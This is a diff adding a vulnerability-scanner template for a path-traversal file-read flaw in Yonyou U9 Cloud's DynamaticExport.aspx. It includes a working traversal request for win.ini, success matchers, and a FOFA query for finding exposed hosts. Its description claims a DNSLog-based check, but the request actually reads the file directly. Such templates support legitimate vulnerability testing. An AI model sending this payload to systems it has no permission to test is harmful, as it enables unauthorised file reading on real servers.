@@ -1,0 +1,26 @@
+id: yonyou-u9cloud-lfi-DynamaticExport
+
+info:
+  name: 用友U9 Cloud DynamaticExport文件读取漏洞
+  author: onewin
+  severity: high
+  description: |
+    通过DNSLog技术验证文件读取漏洞，避免直接读取敏感文件
+  metadata:
+    fofa-query: 'body="logo-u9.png" || body="/U9/css/"'
+  tags: Yonyou-U9
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/print/DynamaticExport.aspx?filePath=../../../../../../../../../../../../Windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[fonts]"
+          - "[extensions]"
+        condition: and
+        part: body
+      - type: status
+        status:
+          - 200
